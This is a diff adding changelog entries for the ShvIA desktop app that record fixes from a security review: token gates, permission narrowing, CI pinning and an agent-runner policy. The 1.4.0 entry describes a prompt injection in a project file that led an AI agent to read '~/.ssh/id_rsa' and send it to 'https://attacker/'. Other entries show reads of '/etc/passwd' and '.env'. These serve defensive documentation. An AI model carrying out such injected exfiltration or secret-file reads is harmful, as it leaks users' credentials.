@@ -3,6 +3,340 @@
 Entradas no formato da mensagem de commit (`versão - comentário`, AGENTS.md),
 mais recente primeiro. É daqui que a skill COMMITTER tira a mensagem (AGENTS.md §PS).
 
+## 1.4.7 - the two Modo Code documents enter the index, and an orphan doc starts failing the build
+
+Finding **D-DOC-10** of the September 2026 review.
+
+- 🟢 **`docs/code/F0-mapa.md` and `docs/code/MODO-CODE-20260709.md` are in `docs/README.md`.**
+  Neither was linked from anywhere — the whole `docs/code/` subdirectory was invisible to
+  anyone navigating the index. `F0-mapa.md` still carries *"aguardando ratificação do Samir"*
+  in its header; it was ratified by the facts (the bridge has existed since 1.1.x and has
+  since been through findings F-12, F-13 and F-15), so the index entry says it is a record of
+  what was known before the code was written, rather than a decision still pending.
+
+- 🟢 **New ruler `todo_doc_e_alcancavel`:** every `.md` under `docs/` must be the target of a
+  markdown link from some index or from another document. It does not judge whether a
+  document is current — only whether you can *reach* it. A new `.md` turns `cargo test` red
+  until someone decides where it belongs in the index, which is exactly the decision nobody
+  makes when a file simply appears.
+
+**Measured.** 78/78 green, clippy clean. Reversion: removing the two index rows → red,
+naming `docs/code/F0-mapa.md`.
+
+## 1.4.6 - CI actions get pinned by SHA, the `anna` floor rises with a reason, and the AGENTS×CLAUDE mirror gets a guard
+
+Findings **F-09**, **F-21** and **F-30** of the September 2026 review.
+
+- 🟢 **Every `uses:` in `ci.yml` is pinned to a commit SHA**, with a comment naming the
+  version (F-09). A tag is a moving pointer and an action runs with this workflow's
+  permissions. New ruler `toda_action_do_ci_esta_pinada_por_sha` sweeps the whole workflow
+  directory, so a future workflow is measured just by existing.
+
+- 🟡 **`ANNA_MINIMO` rises from 0.11.4 to 0.11.9** (F-30) — and the file's own rule was
+  honoured: *"ao subir este piso, escreva o PORQUÊ"*. Two defects that hurt **here**, in the
+  shell, specifically:
+
+  1. Without the `bash` time cap that kills the process **group** (SHVIA-CODE's F-04), a tool
+     that hangs holds the sidecar forever. In the desktop the `anna` is a child of the app:
+     the user has no Ctrl-C to give, only killing the whole app. In a terminal that is an
+     annoyance; embedded, it is a hang with no exit.
+  2. Up to 0.11.8 the `bash` gate matched only the command **prefix**, so `cat .env` ran in
+     **auto** (F-02) — and it is the shell that points `anna` at the user's real project
+     folder, with the Modo Code page coming from the server and updating itself.
+
+  The floor is 0.11.9 and **not** 0.11.11, though the CLI is at 0.11.12: 0.11.10 (HTML
+  escaping in `anna stats`) and 0.11.11 (`cargo deny`) change nothing the bridge depends on.
+  A floor is the lowest version that is safe to package, not the newest number.
+
+- 🟢 **`AGENTS.md` and `CLAUDE.md` are byte-identical below the H1** (F-21), which both files
+  already demanded of themselves — and both violated. Not carelessness: the block that
+  differed was precisely the one saying *"this file is the mirror of the other"*, and written
+  in the first person it **cannot** be identical in both. The rule was impossible to satisfy,
+  which is how an instruction without a guard rots — nobody notices it is asking for the
+  impossible. The pointer is now written in the third person, naming both files, and
+  `agents_e_claude_sao_espelho` checks it on every `cargo test`.
+
+**Measured.** 77/77 green, clippy `-D warnings` clean. Reversions: a loose action in a new
+workflow → red; one extra line in `AGENTS.md` → red.
+
+## 1.4.5 - the microphone only for the server and only the microphone; Linux voice starts requiring the session token
+
+Finding **F-16** of the September 2026 review. Companion to SHVIA-WEB (the entry titled
+"A voz do desktop passa a exigir o token da sessão"); the two must land together, or this
+one after it.
+
+- 🟠 **`shviaTts` now checks the capability token.** The native message handler exists for
+  **every frame** of the webview, so a cross-origin `<iframe>` embedded in a ShvIA page
+  reached it directly: it could speak arbitrary text through the host's `spd-say` and
+  cancel speech with `spd-say -C`, which acts on the whole speech-dispatcher daemon and so
+  left the app's boundary. `pedido_de_voz()` now drops any payload without the session
+  token — silently, because a reply would turn the handler into an oracle for guessing it.
+  `TTS_BRIDGE_JS` gives the page the only remaining door, `window.__shviaTts`, injected
+  (like `BRIDGE_JS`) solely into pages served by a `SERVER_HOSTS` host.
+
+  This is the gate `code_bridge::handle_message` has applied to `shviaCode` since F-12. It
+  never covered voice — not because anyone judged voice harmless, but because the second
+  bridge was registered later on the same `user_content_manager` and **a second bridge does
+  not inherit the first one's gate**.
+
+- 🟠 **Media permission stops being granted to whatever is loaded.** `permite_midia()`
+  replaces the unconditional `req.allow()` on every `UserMediaPermissionRequest` with two
+  narrowings: the main frame must be a ShvIA server host over https (the local shell has no
+  capture UI and never needs a device), and only **audio** is granted — SHVIA-WEB's three
+  `getUserMedia` call sites all ask for `{audio}`, so the camera was a standing grant with
+  no product behind it. Anything else is now `req.deny()`.
+
+  **Measured limitation, 02/09/2026.** WebKitGTK carries no origin and no frame on the
+  request: `webkit2gtk 2.0.2` exposes exactly two getters on `UserMediaPermissionRequest`,
+  `is-for-audio-device` and `is-for-video-device`. So an iframe inside a ShvIA page still
+  asks with the main frame's URI and still gets the microphone; nothing in this API can
+  tell the two apart. To re-check after a crate bump, look for an origin or frame getter in
+  `~/.cargo/registry/src/*/webkit2gtk-*/src/auto/user_media_permission_request.rs`. While
+  there is none, this is as narrow as the API allows — and it is written down rather than
+  left to be noticed again.
+
+**New ruler — `todo_handler_nativo_tem_porta_de_token`.** It does not assert "`shviaTts`
+checks the token"; it counts **registered native handlers against token gates**. Registering
+a third `messageHandler` without a gate turns `cargo test` red before it becomes surface —
+the same shape of defect as `containerDo` (E-5) and the two window builders (F-15): the copy
+is not born wrong, it is born without the rule.
+
+Its first run failed by counting `fn pedido_de_voz(` as a gate — a ruler matching its own
+definition. It counts calls now.
+
+**Measured.** 75/75 green. Three reversions, three reds: dropping the token check (1 red),
+granting video again (2 red), registering a third handler without a gate (1 red).
+`cargo clippy --all-targets -- -D warnings` clean.
+
+**Not proven here.** The WebKitGTK runtime behaviour — that the shim reaches the page, that
+`req.deny()` on video is invisible to the user, that voice still works on the Linux desktop
+— has no automated coverage: it needs the packaged app on a Linux desktop. Smoke test: open
+a chat, press "listen" on an answer (must speak in pt-BR and the button must return from
+"Parar" to "Ouvir"), then press the microphone in the composer (must still record).
+
+## 1.4.4 - the runner gets its lock back, the dev audit goes to zero, and the state doc gets a ruler instead of a fourth cleanup
+
+Findings **F-18**, **F-19** and **F-22** of the September 2026 review.
+
+### F-18 · deleting the lock did not deliver freshness, it moved the staleness
+
+Since 21/08 `claude-runner/install.sh` did `rm -f package-lock.json` before installing, for a
+good reason: the Modo Code catalogue comes from the Agent SDK, so **the SDK version is the
+catalogue**, and a stale lock kept the selector offering "Opus" = Opus 4.8 weeks after Opus 5
+shipped.
+
+🔴 **Measured on 02/09, it was not working.** This machine ran SDK **0.3.239** while a fresh
+resolve of the very same `^0.3.239` gives **0.3.258** — nineteen releases apart. Without a
+lock, the installed version is whatever was latest *the last time somebody happened to
+reinstall*. That is the same staleness the deletion was meant to prevent, now unreviewable as
+well, in a component that executes tools on the developer's machine.
+
+The tradeoff was real; the sides were mislabelled. What ages is not "having a lock" — it is a
+lock **nobody updates**, and a floating range is a lock nobody can see.
+
+So: the lock is versioned, `install.sh` uses `npm ci`, and refreshing is one command —
+`npm run runner:sdk-bump`, which updates the SDK and **prints the resulting catalogue**.
+
+That last part is the point, not decoration. Exercised across two versions it shows the model
+list actually changing: `claude-fable-5[1m]` at 0.3.250 became `claude-fable-5-1[1m]` at
+0.3.258. The risk that motivated the 21/08 decision is now *observable* instead of invisible.
+
+### F-19 · dev advisories
+
+`nanoid` and `postcss`, both high, both build-only (`npm ls --omit=dev` finds neither).
+`npm audit fix` — **zero vulnerabilities**, and `npm run build` still produces the bundle.
+
+### F-22 · the third manual sanitation, replaced by a check
+
+`.continue/estado-atual.md` described **1.1.34** with the repository at 1.4.3, and
+`docs/funcionalidades.md` stopped at **0.18.1** — an entire major line missing.
+
+The detail that decides the fix is inside the file: it already carried a note saying *"Saneado
+em 07/08/2026 — este arquivo estava descrevendo a 0.8.0"*. The sanitation had been done before,
+by hand, for exactly this reason, and the drift came straight back. A third one would buy a few
+weeks.
+
+`scripts/prova-frescor-da-doc.mjs` compares what each document claims against `version.md` and
+fails when the gap passes tolerance. It is in CI. Both documents were brought current in the
+same commit — a guard added while the thing it guards is broken is a guard that starts life
+disabled.
+
+🐛 **Two mistakes of mine, both caught by running it.** The checker first read both files the
+same way and reported `funcionalidades.md` as "1002 minors behind" — its first `0.2.0` is the
+oldest *entry* in a per-version log, not a claim about the document; the right signal there is
+the highest version mentioned. And the distance arithmetic printed "986" across a major
+boundary. Numbers nobody believes produce checks nobody reads.
+
+## 1.4.3 - Rust advisories start being measured, and the first run found the pin the report itself predicted
+
+Findings **DEP-3** and **F-31** of the September 2026 review.
+
+None of the three Rust repositories measured RustSec advisories, while the third-party
+sibling `ai-memory` in the same folder already had a `deny.toml`.
+
+### 🔴 F-31 predicted the exact hole, and it was there
+
+The finding said the `time = "=0.3.41"` pin — documented debt because of `wry`'s `cookie` —
+"is the typical case where an advisory would go unnoticed". It had one:
+**RUSTSEC-2026-0009**, a stack-exhaustion DoS.
+
+And the pin turned out to be **movable with no code change at all**: `time = "=0.3.47"`
+compiles, the lock resolves, and the suite stays at **72/72**. The comment said "remove when
+wry/cookie move to a version that accepts the new `time`" — measurement says that already
+happened and nobody re-checked. The same bump was applied to SHVIA-MOBILE.
+
+### What `deny.toml` carries, and why each line is there
+
+`cargo deny check advisories` was clean on nothing: **19 advisories** in this tree.
+
+- **16 `unmaintained`**, all from Tauri's own dependency graph — the GTK3 bindings via
+  `tray-icon`/`libappindicator`, `proc-macro-error`, and the `unic-*` tables. Every one of
+  them says "No safe upgrade is available!". They leave when Tauri moves to gtk4, which is
+  not a decision this repository can take.
+- 🔴 **2 real vulnerabilities in `quick-xml` 0.38.4** that cannot be closed here. It **does
+  ship in the binary** — `tauri → plist → quick-xml`, a normal dependency, checked with
+  `cargo tree -i quick-xml -e normal`, not assumed. The fix is `>= 0.41` and `plist 1.8.0`
+  requires `^0.38`, so `cargo update -p quick-xml` locks zero packages. What bounds it:
+  `plist` parses the app's own bundle metadata, and no code here feeds it XML from a user, a
+  document or the network.
+- **1 in `time`**, fixed rather than ignored.
+
+Every `ignore` entry has a written `reason` — the same doctrine as
+`scripts/prova-auditoria.mjs` in SHVIA-WORKSPACE. An exception is debt with a reason and a way
+to re-check it; "we'll look later" is not a reason, and a stale reason is worse than none
+because it reads as a decision.
+
+Wired into `.github/workflows/ci.yml`. Measured on both sides: dropping one `ignore` entry
+turns the check red, and putting the `time` pin back to 0.3.41 brings RUSTSEC-2026-0009 back.
+
+## 1.4.2 - a `target=_blank` window stops being a second window with rules of its own
+
+Finding **F-15** of the 01/09/2026 technical review.
+
+Windows opened by `target=_blank` were born from a `WebviewWindowBuilder` of their own, with
+`title` and `window_features` and **nothing else**: no `on_navigation`, no `on_page_load`, no
+icon, no `min_inner_size`, no close handler.
+
+🔴 **The consequence that matters is the first one.** Without `on_navigation`, an external link
+clicked inside that window **navigates inside the app** instead of going to the OS browser. A
+third-party site takes over a window titled "ShvIA", wearing the application's frame — which is
+the classic phishing shape. There was no native exposure (the bridges were not installed
+either), so the perimeter broken was UX, not the filesystem.
+
+**The fix is the same as everywhere in this review: one definition.** `build_shvia_window` now
+takes the URL, and `on_new_window` calls it instead of building on the side. Two windows with
+different rules is the defect shape of `containerDo` (E-5) and of the two update paths (G-21) —
+the second copy is not born wrong, it **ages on its own**.
+
+⚠️ **`window_features` was deliberately left out.** It comes from the PAGE
+(`window.open(..., "width=300")`), and a 300px window with no bar is the other classic phishing
+shape; the size of the app's window is the app's decision. Checked before deciding: the web app
+**does not use `window.open`** anywhere, and the two Blade `target="_blank"` links carry no
+features — so discarding them changes nothing today.
+
+**The rulers** (`so_ha_uma_construcao_de_janela`, `o_target_blank_passa_pela_funcao_canonica`)
+chase the cause and not the symptom: they fail if a second `WebviewWindowBuilder::new` shows up
+outside the canonical function. Measured: with the side construction put back, both go red with
+the right message.
+
+🐛 **The first version of the ruler counted itself.** It measured its own literals — the
+`matches(...)` and the error message — and reported 3 where there was 1. Same stumble as
+`prova-paridade-de-imagens` in WORKSPACE, which flagged `node:fs`. The test module is cut off
+before counting.
+
+**Suite 72/72** (was 70), clippy clean with `-D warnings` on every target.
+
+## 1.4.1 - the proofs start running on every push, and clippy gets its closed door back
+
+Findings **G-24** and **F-20** of the 01/09/2026 technical review.
+
+### G-24 · there was no proof CI, only packaging CI
+
+The `build-*.yml` files existed, packaging into a release. The **proofs** ran only when someone
+remembered. `.github/workflows/ci.yml` now runs on every push and PR:
+
+- `cargo test --locked` — includes `tests_cerca` (F-12), the authorised-folder fence of the
+  `code_bridge` bridge, which previously let `gitStatus`/`readFile`/`spawn` reach any path;
+- `npm run prova:politica` — the policy of the "Claude Code (assinatura)" engine (F-13). It
+  became a testable module precisely because the previous version **passed `node --check` and
+  was broken**: `path` never imported and a nonexistent `log()`. A syntax check is not a smoke
+  test, and this job exists so that lesson does not depend on memory;
+- `npm run prova:bump` — the version carriers aligned (SHVIA-CODE already left `master` not
+  compiling over a half-done bump);
+- `cargo clippy --all-targets -- -D warnings`.
+
+The job installs Tauri's system dependencies on Linux first: without them the `src-tauri`
+`cargo test` does not even compile, and the failure would be environmental, not code.
+
+### F-20 · two clippy warnings sitting there — and there were six
+
+The finding recorded "2 doc warnings". Running `--all-targets`, which also reads the test code,
+there are **six**: the two list-indentation ones in a doc comment (`code_bridge.rs`) plus four
+`std::iter::repeat(x).take(n)` where `x.repeat(n)` fits.
+
+This was found **by running the command** while writing the CI, not by reading the finding — the
+job would have been born red. A warning with no closed door piles up until nobody reads the
+output any more, and a CI that fails on day one is ignored on day two.
+
+**Measured:** `cargo test --locked` **70/70**; `cargo clippy --locked --all-targets -D warnings`
+clean; `prova:politica` and `prova:bump` green.
+
+⚠️ **The workflow itself could not be executed here** — it only runs on GitHub. What was
+verified locally is each command it invokes, and that the YAML parses with the right triggers.
+The first real run is on the first push.
+
+## 1.4.0 - the Modo Code fence starts coming from the user's gesture, and the runner stops being the back door
+
+Findings **F-12** and **F-13** of the 01/09/2026 technical review — the last two links in the
+chain that ran from an XSS in SHVIA-WEB to the disk of whoever uses the desktop. Decisions in
+[ADR-031](docs/decisoes.md) and [ADR-032](docs/decisoes.md).
+
+🔴 **F-12 — whoever asked chose the fence.** `listTree`, `readFile`, `gitStatus`, `gitDiff` and
+`spawn` confined the target inside a `path` that **the page itself** sent in the message.
+`read_file` required the file to be inside the `path`, and the `path` came from whoever was
+asking: so `readFile('/', '/etc/passwd')` passed, and so did `listTree('/')`. The capability
+token closes off the **iframe**, not the page — an XSS in the web app (whose CSP is born
+disabled) runs in the origin that holds the token. `spawn` itself already recognised that actor
+in order to validate the `url`; the same message, in the same handler, read the whole disk.
+
+- **The authorised-folder list only grows through the native dialog** (`pick_folder`). Choosing
+  the folder is the gesture; no message from the page authorises anything.
+- **`setBinding` stops accepting a free path** — without that the page would reopen the fence
+  from outside, writing the binding and then asking for the read.
+- **`spawn` is fenced too:** `projectDir` is where the agent will read and write for hours.
+- Comparison by **canonical** path and by **component**, so `..`, symlinks and a
+  similarly-named neighbour (`/x/projeto2` against `/x/projeto`) do not get in. 5 tests.
+- ⚠️ **Migration:** the list is seeded **once** with the bindings the page had already written —
+  without that, everyone would lose their project folder and have to pick it again. The residue
+  is written into the ADR: an installation already compromised before this version keeps what it
+  wrote.
+
+🔴 **F-13 — the other engine had the door open.** In `claude-runner`,
+`Read`/`Glob`/`Grep`/`LS` of **any path** and `WebFetch`/`WebSearch` to **any URL** were
+automatic, and `--aprovacao auto` released `Bash` entirely. A prompt injection in a project file
+composed `Read ~/.ssh/id_rsa` → `WebFetch https://attacker/?d=…` without a card. The file's own
+comment said that "one engine cannot be the other's back door".
+
+- **The network always asks**, at any level — `WebFetch`/`WebSearch` leave the read list.
+- **Reading is automatic only inside the folder and outside the secrets denylist** — the same
+  one as `anna`. Confining was not enough: the project's `.env` is inside the fence and is the
+  first target.
+- **Destructive asks for a card even at the `auto` level** (the rule `anna` calls "`y` does not
+  count").
+- **The policy became a module** (`claude-runner/politica.mjs`) with 8 tests in `node --test`
+  (`npm run prova:politica`). The runner executes on import, so nothing inside it was testable:
+  this shell's security boundary had no proof at all (finding F-29). Nothing here **blocks** —
+  what leaves the automatic path becomes a card, and the developer decides.
+
+🐛 **And the suite was red, hiding exactly these changes.** `user_env::computar` had an
+invariant written in its comment — *"União: base + extras"* — that the code did not honour: when
+the login shell answered, the answer **replaced** the process PATH instead of adding to it.
+Whoever opens the app from the terminal, with nvm or a venv in the session, lost those
+directories in the sidecar — and the agent kept insisting on a command that exists in the
+terminal next door. The test `computar_nunca_perde_o_que_ja_havia` asserted exactly that and had
+been failing since before (finding F-14): it was the code that disagreed with its own comment.
+Suite now **70/70**.
+
 ## 1.3.6 - Agent doc: Releases rule and the English-only language rule
 
 Marked echo of the single source at samirhvbr/repodocs. Two rules land here:
